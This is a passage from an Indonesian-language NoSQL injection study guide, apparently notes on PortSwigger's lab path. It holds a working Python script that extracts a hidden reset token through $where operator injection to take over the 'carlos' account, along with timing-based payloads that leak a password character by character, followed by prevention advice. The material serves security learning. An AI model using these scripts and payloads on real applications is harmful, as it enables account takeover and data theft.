        "$where": f"this.{FIELD}.match('^.{{{i}}}$')",
    }
    if is_true(s.post(URL, json=payload, allow_redirects=False, timeout=10)):
        length = i
        break
print(f"length = {length}")

if not length:
    exit(1)

# value
val = ""
for pos in range(length):
    for ch in CHARSET:
        payload = {
            "username": "carlos",
            "password": {"$ne": "test"},
            "$where": f"this.{FIELD}.match('^.{{{pos}}}{re.escape(ch)}.*')",
        }
        if is_true(s.post(URL, json=payload, allow_redirects=False, timeout=10)):
            val += ch
            print(f"\r{FIELD} = {val}", end="", flush=True)
            break
    else:
        val += "?"
print(f"\n{FIELD} = {val}")
```

5. Buka `/forgot-password?changePwd=<token>` (ganti dengan nilai token yang diekstrak).
6. Ubah password `carlos`.
7. Login sebagai `carlos` dengan password baru.
8. Lab selesai.

##### Referensi

<details>
<summary> Portswigger - NoSQL injection - Lab #4 Exploiting NoSQL operator injection to extract unknown field — Popo Hack</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=tyRjEuj8sf4
Tujuan: Video ini menunjukkan cara mengeksploitasi NoSQL operator injection untuk mengekstrak field yang tidak diketahui pada lab Web Security Academy (PortSwigger).
</details>

</details>

### Injeksi Berbasis Timing

Terkadang memicu error database tidak menyebabkan perbedaan pada respons aplikasi. Dalam situasi ini, kamu masih dapat mendeteksi dan mengeksploitasi kerentanan dengan menggunakan JavaScript injection untuk memicu time delay kondisional.

Untuk melakukan timing-based NoSQL injection:

1. Muat halaman beberapa kali untuk menentukan baseline waktu loading.
2. Sisipkan payload berbasis timing ke input. Payload ini menyebabkan penundaan respons yang disengaja saat dieksekusi. Misalnya, `{"$where":"sleep(5000)"}` menyebabkan penundaan 5000 ms jika injeksi berhasil.
3. Identifikasi apakah respons memicu time delay, misalnya jika password diawali huruf `a`:

```json
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

![Wait response sleep(5000)](images/time-based/01-wait-response-sleep-5000.png)

![Response output with ~5 second delay (5184 ms)](images/time-based/02-response-delay-5184ms.png)

### Mencegah NoSQL Injection

Cara yang tepat untuk mencegah serangan NoSQL injection bergantung pada teknologi NoSQL spesifik yang digunakan. Karena itu, disarankan membaca dokumentasi keamanan dari database NoSQL pilihanmu. Meski demikian, panduan umum berikut juga membantu:

- Sanitasi dan validasi input pengguna menggunakan allowlist karakter yang diterima.
- Sisipkan input pengguna menggunakan parameterized queries alih-alih menggabungkan input pengguna langsung ke dalam kueri.
- Untuk mencegah operator injection, terapkan allowlist key yang diterima.

## Selesai! Kamu telah menyelesaikan NoSQL Injection.

**NoSQL Injection (NoSQLi)**

Learning path ini memperkenalkan NoSQL Injection (NoSQLi), kerentanan keamanan web yang memengaruhi aplikasi yang menggunakan database NoSQL. Kamu telah mempelajari cara mendeteksi dan mengeksploitasi NoSQL Injection untuk melewati autentikasi, mengekstrak data tersembunyi, memanipulasi perilaku aplikasi, serta memahami teknik penting untuk mengamankan aplikasi dari serangan NoSQLi.

[PortSwigger – NoSQL Injection Learning Path](https://portswigger.net/web-security/learning-paths/nosql-injection/)

**Status:** Completed ✓
